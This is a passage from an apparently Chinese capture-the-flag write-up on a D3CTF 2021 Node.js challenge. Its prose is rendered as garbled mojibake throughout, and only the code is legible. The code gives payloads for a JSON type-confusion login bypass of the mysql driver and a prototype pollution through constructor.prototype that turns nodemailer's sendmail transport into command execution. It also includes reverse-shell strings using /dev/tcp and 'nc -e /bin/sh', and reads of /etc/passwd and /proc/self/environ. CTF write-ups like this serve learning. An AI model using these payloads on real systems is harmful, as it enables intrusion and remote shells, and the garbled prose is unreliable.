class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>è‰ï¼Œè¿˜è¦ <strong>SQL æ³¨å…¥</strong>â€¦â€¦</p><p>äºæ˜¯ <strong>æ€è·¯å°±æ˜¯é¦–å…ˆ SQL æ³¨å…¥ç™»å½• admin ç”¨æˆ·ï¼Œç„¶åé€šè¿‡å‘é‚®ä»¶çš„æ¥å£æ±¡æŸ“åŸå‹é“¾è¯»å– flagï¼Œæˆ–è€…åå¼¹ shell ä¹‹ç±»çš„ã€‚</strong></p><p>ä½†æ˜¯æ³¨æ„çš„æ˜¯ï¼Œå®ƒè¿™é‡Œä¸æ˜¯æ‰‹åŠ¨æ‹¼æ¥çš„ SQL è¯­å¥ï¼Œåˆ©ç”¨ nodejs é‡Œçš„ mysql å°è£…å¥½çš„å‡½æ•°ï¼Œé€šè¿‡å ä½ç¬¦å’Œå‚æ•°æ¥è¿›è¡Œçš„ï¼Œè¿™æ ·ä¼šè‡ªåŠ¨è½¬ä¹‰å±é™©çš„å­—ç¬¦ã€‚</p><p><em>äºæ˜¯è¿™é‡Œè¯•äº†æŒºä¹…éƒ½æ²¡æ‰“é€šï¼ˆï¼ˆ</em></p><p>ç½‘é¡µä¸Šè¯•äº†è¯•ï¼Œå‘ç°æ˜¯ urlencode ä¼ å‚ï¼Œä½†æ˜¯åœ¨ <code>app.js</code> ä¸­å¯ä»¥çŸ¥é“ json ä¹Ÿæ”¯æŒçš„ï¼Œé‚£å°±å¼€æ‰“ã€‚</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308015523323.png" alt="json"></p><p>SQL æ³¨å…¥ï¼Œä¸€èˆ¬çš„ç»•è¿‡éƒ½ä¸å¤§è¡Œï¼Œä½†æ˜¯<strong>åˆ©ç”¨ JavaScript çš„å¼±ç±»å‹å’Œ JSON çš„ç‰¹æ€§</strong>ï¼Œå¯ä»¥ä¼ å…¥ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ã€‚</p><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/niexinming/article/details/84889275">nodejsåº”ç”¨ä¸­çš„æƒé™ç»•è¿‡æ¼æ´â€”ä¸€ä¸ªèµé‡‘æ¼æ´çš„æ•…äº‹</a></p><p><a href="https://xz.aliyun.com/t/6991">ä¸€é“æœ‰è¶£çš„å…³äºnodejsçš„ctfé¢˜</a></p></blockquote><p>æ„é€ ç™»å½• payloadï¼Œæ‰“è¿‡å»ã€‚</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token property">"password"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token property">"password"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>å‘ç°ç¡®å®ç™»å½•æˆåŠŸäº†ï¼Œä½†æ˜¯çœ‹ä¸Šå»å¹¶ä¸æ˜¯ adminã€‚</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308020555039.png"></p><p>å¯æ˜¯é˜Ÿå‹æœ¬åœ°æ­ç¯å¢ƒå‡ºæ¥ç¡®å®å¯è¡Œã€‚</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308021608528.png"></p><p><em>ä¸çŸ¥é“æ˜¯æ•°æ®åº“ç¯å¢ƒçš„é—®é¢˜è¿˜æ˜¯ä»€ä¹ˆï¼ˆ</em></p><p>åæ¥åˆè¯•äº†è¯•ï¼Œå‘ç° 0 1 4 5 ç­‰å¥½å‡ ä¸ªå€¼éƒ½èƒ½ç»•è¿‡ï¼ŒæˆåŠŸç™»å½•ï¼Œä½†éƒ½ä¸æ˜¯ adminã€‚</p><p>äºæ˜¯è€ƒè™‘ <code>username</code> è¿˜å¾—æ˜¯ <code>admin</code>ã€‚</p><p>åœ¨ä¸æ–­åœ°å°è¯•ä¸‹ï¼Œæ„é€ </p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>ç”Ÿæˆçš„ SQL ä¸º</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">AND</span> password <span class="token operator">=</span> <span class="token punctuation">`</span>password<span class="token punctuation">`</span> <span class="token operator">=</span> <span class="token number">1</span></code></pre><p>æ‰“è¿‡å»ï¼Œç»ˆäºæˆäº†ã€‚</p><p>æ¥ä¸‹æ¥å°± <strong>æ±¡æŸ“åŸå‹é“¾</strong>ã€‚</p><p>çœ‹äº†çœ‹ <a href="https://github.com/robinvdvleuten/shvl">shvl é¡¹ç›®æ–‡æ¡£</a>.</p><blockquote><p>ğŸš§ Get and set dot-notated properties within an object.    </p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308022442894.png"></p></blockquote><p>å¯ä»¥é€šè¿‡ <code>.</code> æ¥ç´¢å¼•ï¼Œ<code>shvl.set(obj, 'a.b.c', 2);</code> è¿™æ ·æ¥ç»™ object èµ‹å€¼ã€‚</p><p>æœ¬æ¥å…ˆæƒ³ç€åå¼¹ shellï¼Œå‘ç°ä¸è¡Œã€‚</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"to"</span><span class="token operator">:</span><span class="token string">"xxx"</span><span class="token punctuation">,</span><span class="token property">"subject"</span><span class="token operator">:</span><span class="token string">"Weekend"</span><span class="token punctuation">,</span><span class="token property">"text"</span><span class="token operator">:</span><span class="token string">"Goodday"</span><span class="token punctuation">,</span> <span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"env"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"AAAA"</span><span class="token operator">:</span><span class="token string">"require(\"child_process\").exec(\"bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1\")//"</span><span class="token punctuation">,</span> <span class="token property">"NODE_OPTIONS"</span><span class="token operator">:</span><span class="token string">"--require /proc/self/environ"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">//æˆ–è€…</span><span class="token punctuation">{</span><span class="token property">"to"</span><span class="token operator">:</span><span class="token string">"xxx"</span><span class="token punctuation">,</span><span class="token property">"subject"</span><span class="token operator">:</span><span class="token string">"Weekend"</span><span class="token punctuation">,</span><span class="token property">"text"</span><span class="token operator">:</span><span class="token string">"Goodday"</span><span class="token punctuation">,</span> <span class="token property">"__proto__.env.AAAA"</span><span class="token operator">:</span> <span class="token string">"require(\"child_process\").exec(\"bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1\")//"</span><span class="token punctuation">,</span> <span class="token property">"__proto__.env.NODE_OPTIONS"</span><span class="token operator">:</span><span class="token string">"--require /proc/self/environ"</span><span class="token punctuation">}</span></code></pre><p><del>åæ¥æƒ³åˆ°è¿™ä¸ªè²Œä¼¼éœ€è¦ fork è¿›ç¨‹æ‰èƒ½å®ç°ï¼Œäºæ˜¯ä¸è¡Œã€‚</del>ï¼ˆå†åæ¥å‘ç°åˆå¯ä»¥äº†ï¼Œæœ‰ <code>spawn</code></p><p>ç„¶åå†è¯•äº†è¯•ï¼Œå‘ç°è²Œä¼¼ä¸èƒ½æ±¡æŸ“åŸå‹é“¾â€¦â€¦ï¼ˆï¼Ÿï¼Ÿï¼Ÿï¼‰</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"to"</span><span class="token operator">:</span><span class="token string">"xxx"</span><span class="token punctuation">,</span><span class="token property">"subject"</span><span class="token operator">:</span><span class="token string">"Weekend"</span><span class="token punctuation">,</span><span class="token property">"text"</span><span class="token operator">:</span><span class="token string">"Goodday"</span><span class="token punctuation">,</span> <span class="token property">"__proto__.html"</span><span class="token operator">:</span><span class="token string">"&lt;i&gt;Miao&lt;/i&gt;233333"</span><span class="token punctuation">}</span></code></pre><p>è¿™ä¸ªæ‰“è¿‡å»æ”¶åˆ°çš„é‚®ä»¶é‡Œå¹¶ä¸æ˜¯ <code>html</code> ä¸­çš„å†…å®¹ï¼Œè¯´æ˜æ²¡æœ‰æ±¡æŸ“åˆ°ã€‚</p><p>å†å»çœ‹ <code>utils/mail.js</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> nodemailer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"nodemailer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">send</span><span class="token punctuation">(</span><span class="token parameter">contents</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> transporter <span class="token operator">=</span> nodemailer<span class="token punctuation">.</span><span class="token function">createTransport</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  host<span class="token operator">:</span> <span class="token string">"******"</span><span class="token punctuation">,</span> <span class="token comment">// Plz use your own smtp server for testing.</span>  port<span class="token operator">:</span> <span class="token number">25</span><span class="token punctuation">,</span>  tls<span class="token operator">:</span> <span class="token punctuation">{</span> rejectUnauthorized<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>  auth<span class="token operator">:</span> <span class="token punctuation">{</span>    user<span class="token operator">:</span> <span class="token string">"******"</span><span class="token punctuation">,</span>    pass<span class="token operator">:</span> <span class="token string">"******"</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> transporter<span class="token punctuation">.</span><span class="token function">sendMail</span><span class="token punctuation">(</span>contents<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> send<span class="token punctuation">;</span></code></pre><p>è°ƒç”¨äº† nodemailer è¿›è¡Œå‘é€ã€‚</p><p>æŸ¥çœ‹å…¶æ–‡æ¡£ <a href="https://nodemailer.com/message/">Message configuration</a>ï¼Œå‘ç°æœ‰ä¸ª <a href="https://nodemailer.com/message/attachments/">Attachments</a>ï¼Œå¯ä»¥å‘é™„ä»¶ï¼Œé‚£å°±è¯•è¯•èƒ½å¦æŠŠ flag å¸¦å‡ºæ¥ã€‚</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"to"</span><span class="token operator">:</span><span class="token string">"xxx"</span><span class="token punctuation">,</span><span class="token property">"subject"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"text"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token property">"attachments"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"/readflag"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token property">"to"</span><span class="token operator">:</span><span class="token string">"xxx"</span><span class="token punctuation">,</span><span class="token property">"subject"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"text"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token property">"attachments"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"/flag"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308020250285.png"></p><p>å¤±è´¥äº†ï¼Œæ²¡æœ‰æƒé™æ‰§è¡Œã€‚</p><p>ç„¶åè¯»äº†ç‚¹å…¶ä»–ä¸œè¥¿ï¼Œè¯•äº†ä¸‹å½“å‰ç›®å½•åœ¨ <code>/var/www/web</code></p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308023821295.png" alt="/etc/passwd"></p><p><code>/proc/self/environ</code> ç¯å¢ƒå˜é‡</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308023927259.png" alt="/proc/self/environ"></p><p>ä»¥åŠ æ•°æ®åº“/session/mail çš„ä¸€äº›ä¿¡æ¯ï¼Œä½†æ˜¯ä¹Ÿæ²¡å•¥ç”¨å•Šã€‚</p><p><del>éš¾ä¸æˆ SMTP å»çªƒå–åˆ«äººçš„é™„ä»¶</del>ï¼ˆæ²¡è¯•è¿‡ä¸çŸ¥é“è¡Œä¸è¡Œ 233</p><p>è¿™æ—¶å€™å†å›è¿‡æ¥çœ‹ <a href="https://github.com/robinvdvleuten/shvl/blob/master/index.js">shvl æºç </a></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">set</span>  <span class="token punctuation">(</span><span class="token parameter">object<span class="token punctuation">,</span> path<span class="token punctuation">,</span> val<span class="token punctuation">,</span> obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">__proto__</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>path <span class="token operator">=</span> path<span class="token punctuation">.</span>split <span class="token operator">?</span> path<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">:</span> path<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> p</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> obj<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> obj <span class="token operator">=</span> object<span class="token punctuation">)</span><span class="token punctuation">[</span>path<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">)</span><span class="token punctuation">,</span> object<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>å™¢ï¼ŒåŸæ¥å®ƒæŠŠ <code>__proto__</code> ç»™è¿‡æ»¤æ‰äº†ï¼Œéš¾æ€ªæ‰“ä¸é€šã€‚</p><p>ä½†æ˜¯è¿˜æœ‰ <code>constructor: { prototype: { attachments: { path: '/readflag' } } }</code> è¿™æ ·åº”è¯¥èƒ½ç»•è¿‡ã€‚</p><p>ç›´æ¥å†™å‘ç°æ²¡æœ‰é™„ä»¶ã€‚</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308024558092.png"></p><p>è¿˜æ˜¯éœ€è¦ç”¨ <code>.</code> æ¥ã€‚</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308024640208.png"></p><p>è¿™å›æ€è·¯å°±é€šäº†ï¼Œå°± <strong>æ‰¾æ±¡æŸ“å“ªé‡Œèƒ½æ‰§è¡Œä»£ç </strong> å‘¢ã€‚</p><p>åˆå»ç¿» nodemailer çš„æºç ã€‚</p><p>æ ¹æ®æ–‡æ¡£ <a href="https://nodemailer.com/transports/sendmail/">Sendmail transport</a>ï¼Œå‘ç°å¯ä»¥ä¼ ä¸ª <code>args</code> å‚æ•°ã€‚</p><p>è·Ÿè¿› <code>send</code> æºç </p><p><a href="https://github.com/nodemailer/nodemailer/blob/master/lib/sendmail-transport/index.js#L108">node_modules/nodemailer/lib/sendmail-transport/index.js#108</a></p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308025427279.png"></p><p>å¥½å®¶ä¼™ï¼</p><p><strong>é‚£å°±æŠŠ <code>path</code> <code>args</code> ç»™æ±¡æŸ“å¥½äº†ã€‚</strong></p><p>æ„é€ ä»£ç æˆä¸‹é¢è¿™æ ·ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> nodemailer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"nodemailer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> transporter <span class="token operator">=</span> nodemailer<span class="token punctuation">.</span><span class="token function">createTransport</span><span class="token punctuation">(</span><span class="token punctuation">{</span>sendmail<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>path<span class="token operator">:</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">,</span>args<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"touch /tmp/a"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>transporter<span class="token punctuation">.</span><span class="token function">sendMail</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token keyword">from</span><span class="token operator">:</span> <span class="token string">"sender@example.com"</span><span class="token punctuation">,</span>to<span class="token operator">:</span> <span class="token string">"recipient@example.com"</span><span class="token punctuation">,</span>subject<span class="token operator">:</span> <span class="token string">"Message"</span><span class="token punctuation">,</span>text<span class="token operator">:</span> <span class="token string">"I hope this message gets delivered!"</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> info</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>info<span class="token punctuation">.</span>envelope<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>info<span class="token punctuation">.</span>messageId<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å†å‚è€ƒ <a href="https://nikoeurus.github.io/2019/12/18/D^3ctf-ezts/">2019 D^3 CTF-eztså¤ç°</a></p><p>è¿™é¢˜åº”è¯¥æ‰§è¡Œ <code>/readflag</code> å°±èƒ½è¾“å‡º <code>/flag</code>ã€‚</p><p><strong>Payload:</strong></p><p>å…ˆæŠŠ flag è¯»å‡ºæ¥ï¼Œå†é€šè¿‡é™„ä»¶å‘é‚®ä»¶ã€‚</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"to"</span><span class="token operator">:</span><span class="token string">"xxx"</span><span class="token punctuation">,</span><span class="token property">"subject"</span><span class="token operator">:</span><span class="token string">"/readflag test"</span><span class="token punctuation">,</span><span class="token property">"text"</span><span class="token operator">:</span><span class="token string">"/readflag test"</span><span class="token punctuation">,</span> <span class="token property">"constructor.prototype.sendmail"</span><span class="token operator">:</span> <span class="token string">"true"</span><span class="token punctuation">,</span> <span class="token property">"constructor.prototype.path"</span><span class="token operator">:</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token property">"constructor.prototype.args"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"/readflag&gt;/tmp/miao"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token property">"to"</span><span class="token operator">:</span><span class="token string">"xxx"</span><span class="token punctuation">,</span><span class="token property">"subject"</span><span class="token operator">:</span><span class="token string">"flag"</span><span class="token punctuation">,</span><span class="token property">"text"</span><span class="token operator">:</span><span class="token string">"temp"</span><span class="token punctuation">,</span> <span class="token property">"constructor.prototype.attachments.path"</span><span class="token operator">:</span> <span class="token string">"/tmp/miao"</span><span class="token punctuation">}</span></code></pre><p>å‘ç°å†™çš„æ—¶å€™æŠ¥é”™ï¼Œä½†ç¡®å®å†™å…¥æ–‡ä»¶äº†ã€‚</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308030017920.png"></p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308023631060.png"></p><p>æœ€ååœ¨ é‚®ä»¶é™„ä»¶é‡Œæ‹¿åˆ° flag</p><p><code>d3ctf{01c185051349caebc42bf2a2bef08e9cca73b0f9bf680cf6406127081c6679eb}</code></p><p>å“‡å‘œï¼ï¼ï¼ï¼ï¼ç»ˆäºå‡ºäº†ï¼ï¼ï¼</p><p>è¿™é¢˜å’Œé˜Ÿå‹ä»æ™šä¸Š 6.çœ‹åˆ° 11. å¤ªé¡¶äº†ï¼</p><p><del>å¯æ˜¯æ¯”èµ›ç»“æŸäº†</del> å‘œå‘œå‘œ</p><p>é—®é¢˜ä¸å¤§ï¼Œå­¦åˆ°äº†è®¸å¤šã€‚</p><p>BTW, è¯»äº†ä¸€ä¸‹æ ¹ç›®å½•ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">total <span class="token number">876</span>drwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Mar  <span class="token number">5</span> 05:08 <span class="token builtin class-name">.</span>drwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Mar  <span class="token number">5</span> 05:08 <span class="token punctuation">..</span>-rwxr-xr-x    <span class="token number">1</span> root     root             <span class="token number">0</span> Mar  <span class="token number">5</span> 05:08 .dockerenvdrwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Feb <span class="token number">24</span> <span class="token number">21</span>:05 bindrwxr-xr-x    <span class="token number">5</span> root     root           <span class="token number">340</span> Mar  <span class="token number">6</span> 04:35 devdrwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Mar  <span class="token number">5</span> <span class="token number">16</span>:10 etc----------    <span class="token number">1</span> root     root            <span class="token number">71</span> Mar  <span class="token number">5</span> 03:52 flagdrwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Feb <span class="token number">24</span> <span class="token number">21</span>:05 homedrwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Feb <span class="token number">24</span> <span class="token number">21</span>:05 libdrwxr-xr-x    <span class="token number">5</span> root     root          <span class="token number">4096</span> Feb <span class="token number">23</span> <span class="token number">19</span>:33 mediadrwxr-xr-x    <span class="token number">2</span> root     root          <span class="token number">4096</span> Feb <span class="token number">23</span> <span class="token number">19</span>:33 mntdrwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Feb <span class="token number">24</span> <span class="token number">21</span>:05 optdr-xr-xr-x  <span class="token number">222</span> root     root             <span class="token number">0</span> Mar  <span class="token number">6</span> 04:35 proc---S-----x    <span class="token number">1</span> root     root        <span class="token number">803240</span> Feb <span class="token number">27</span> 07:56 readflagdrwx------    <span class="token number">1</span> root     root          <span class="token number">4096</span> Mar  <span class="token number">6</span> 04:20 rootdrwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Mar  <span class="token number">7</span> 00:21 rundrwxr-xr-x    <span class="token number">2</span> root     root          <span class="token number">4096</span> Feb <span class="token number">23</span> <span class="token number">19</span>:33 sbindrwxr-xr-x    <span class="token number">2</span> root     root          <span class="token number">4096</span> Feb <span class="token number">23</span> <span class="token number">19</span>:33 srvdr-xr-xr-x   <span class="token number">13</span> root     root             <span class="token number">0</span> Mar  <span class="token number">6</span> 04:35 sysdrwxrwxrwt    <span class="token number">1</span> root     root          <span class="token number">4096</span> Mar  <span class="token number">7</span> <span class="token number">15</span>:25 tmpdrwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Feb <span class="token number">24</span> <span class="token number">21</span>:05 usrdrwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Mar  <span class="token number">3</span> <span class="token number">15</span>:48 var</code></pre><p><code>readflag</code> æœ‰ <code>S</code>å±æ€§ï¼Œèƒ½å¤Ÿä¸´æ—¶æå‡æƒé™æ¥è¯»å– <code>flag</code>ã€‚</p><p>ä»£ç ç±»ä¼¼äº</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">seteuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setegid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><hr><p>çœ‹äº†å®˜æ–¹ WPï¼Œå‘ç°ç¡®å®æœ‰ä¸€ç§æ±¡æŸ“ç¯å¢ƒå˜é‡çš„æ–¹æ³•ã€‚</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210312222313025.png" alt="è§£æ³•äºŒ"></p><p><a href="https://blog.p6.is/Abusing-Environment-Variables/">https://blog.p6.is/Abusing-Environment-Variables/</a></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"constructor.prototype.env"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"NODE_DEBUG"</span><span class="token operator">:</span> <span class="token string">"require('child_process').execSync('nc ip port -e/bin/sh')//"</span><span class="token punctuation">,</span><span class="token property">"NODE_OPTIONS"</span><span class="token operator">:</span> <span class="token string">"-r /proc/self/environ"</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"constructor.prototype.sendmail"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token property">"constructor.prototype.shell"</span><span class="token operator">:</span> <span class="token string">"/bin/node"</span><span class="token punctuation">}</span></code></pre><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>misc å…¶ä»–é¢˜ç›®çš„è¯ï¼Œæ¯”å¦‚ï¼š</p><ul><li><p><strong>é‡å­å¯†é’¥åˆ†å‘</strong>ï¼ˆ<a href="https://en.wikipedia.org/wiki/Quantum_key_distribution">quantum key distribution</a>ï¼ŒQKDï¼‰ï¼Œç”¨çš„åº”è¯¥æ˜¯ <a href="https://en.m.wikipedia.org/wiki/BB84">BB84 åè®®</a>ã€‚</p><p>ä¸è¿‡æµé‡åŒ…æå–ä¸å‡ºæ¥ï¼Œèµ›åæ‰å‘ç°ç¡®å®å°±æ˜¯ Python åºåˆ—åŒ–åçš„ï¼Œå¯ä»¥å¯¼å‡º JSON å†æå– data å†ååºåˆ—åŒ–</p><p>ç½‘ä¸Šæ‰¾åˆ°çš„å‡ ä¸ª <a href="https://ctftime.org/event/809">Google Capture The Flag 2019 (Quals)</a> çš„ Writeupï¼š</p><p><a href="https://github.com/shahar603/CTF-Writeups/blob/master/2019/Google%20CTF%202019%20Quals/Quantum_Key_Distribution.md">https://github.com/shahar603/CTF-Writeups/blob/master/2019/Google%20CTF%202019%20Quals/Quantum_Key_Distribution.md</a></p><p><a href="https://sasdf.github.io/ctf/writeup/2019/google/crypto/qkd/">https://sasdf.github.io/ctf/writeup/2019/google/crypto/qkd/</a></p><p><a href="https://ctftime.org/writeup/15844">https://ctftime.org/writeup/15844</a></p><p><a href="https://ctftime.org/writeup/18212">https://ctftime.org/writeup/18212</a></p><p>çœ‹äº†å®˜æ–¹ wpï¼Œå¥½å®¶ä¼™ï¼Œpython æœ‰ä¸ª pyshark åŒ…èƒ½ç›´æ¥æå–å•Šâ€¦â€¦</p></li><li><p>è¿˜æœ‰ä¸ª Robust 